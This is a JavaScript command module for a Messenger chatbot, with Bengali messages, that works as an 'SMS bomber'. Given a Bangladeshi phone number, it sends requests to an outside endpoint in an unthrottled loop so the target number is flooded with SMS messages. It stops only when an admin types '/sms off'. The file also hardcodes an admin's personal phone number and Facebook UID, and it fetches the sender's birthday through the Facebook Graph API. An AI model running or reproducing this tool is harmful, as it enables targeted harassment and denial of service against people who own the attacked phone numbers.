module.exports.config = {
  name: "sms",
  version: "2.0.0",
  hasPermssion: 0,
  credits: "CYBER BOT TEAM",
  description: "SMS বোম্বার চালু/বন্ধ",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};

const axios = require("axios");
const bombingFlags = {};

// এডমিন UID ও ফোন
const adminUIDs = ["100013678366954"]; // রাজার UID
const adminPhone = "01715559179";      // রাজার মোবাইল

// Access Token দিন এখানে
const FACEBOOK_ACCESS_TOKEN = "আপনার_ফেসবুক_অ্যাক্সেস_টোকেন_এখানে_দিবেন";

// সিকিউরিটি চেক
if (!adminUIDs.includes("100013678366954") || adminPhone !== "01715559179") {
  throw new Error("❌ এডমিন UID বা ফোন নম্বর পরিবর্তিত হয়েছে বা মুছে ফেলা হয়েছে! স্ক্রিপ্ট বন্ধ।");
}

// বাংলা মাসের নাম
function getBanglaMonth(monthIndex) {
  const months = [
    "জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন",
    "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"
  ];
  return months[monthIndex];
}

// তারিখ ও সময় ফরম্যাট
function formatDateTime(date) {
  const year = date.getFullYear();
  const month = getBanglaMonth(date.getMonth());
  const day = date.getDate();
  const hours = date.getHours().toString().padStart(2, "0");
  const minutes = date.getMinutes().toString().padStart(2, "0");
  const seconds = date.getSeconds().toString().padStart(2, "0");

  return `${day} ${month} ${year}, ${hours}:${minutes}:${seconds}`;
}

module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const senderID = event.senderID;
  const number = args[0];

  // শুধু অ্যাডমিন
  if (!adminUIDs.includes(senderID)) {
    return api.sendMessage("⚠️ আপনি এই কমান্ড ব্যবহারের অনুমতি পাননি।", threadID);
  }

  // ফেসবুক থেকে জন্মদিন আনা
  let userBirthday = "জন্মদিন তথ্য পাওয়া যায়নি।";
  try {
    const res = await axios.get(`https://graph.facebook.com/${senderID}`, {
      params: {
        fields: "birthday",
        access_token: FACEBOOK_ACCESS_TOKEN
      }
    });

    if (res.data && res.data.birthday) {
      userBirthday = res.data.birthday; // "MM/DD/YYYY" বা "MM/DD"
    }
  } catch (e) {
    console.log("Birthday fetch error:", e.message);
  }

  // লোকেশন (ঢাকা ধরে নেওয়া)
  const latitude = 23.8103;
  const longitude = 90.4125;
  const locationURL = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;

  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage(
      "❗ সঠিক ফরম্যাটে বাংলাদেশি নাম্বার দিন!\n\nUsage:\n/sms 01xxxxxxxxx",
      threadID
    );
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /sms off", threadID);
  }

  bombingFlags[threadID] = true;

  const now = new Date();
  const formattedDateTime = formatDateTime(now);
  const userProfile = `https://facebook.com/${senderID}`;

  api.sendMessage(
    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে।\n\n` +
    `⏰ সময়: ${formattedDateTime}\n` +
    `📍 লোকেশন (ধারণা): ${locationURL}\n` +
    `👤 ইউজার প্রোফাইল: ${userProfile}\n` +
    `🎂 আপনার জন্মদিন: ${userBirthday}\n` +
    `📞 এডমিন: রাজা (${adminPhone})\n\n` +
    `বন্ধ করতে /sms off`,
    threadID
  );

  // বোম্বিং শুরু
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
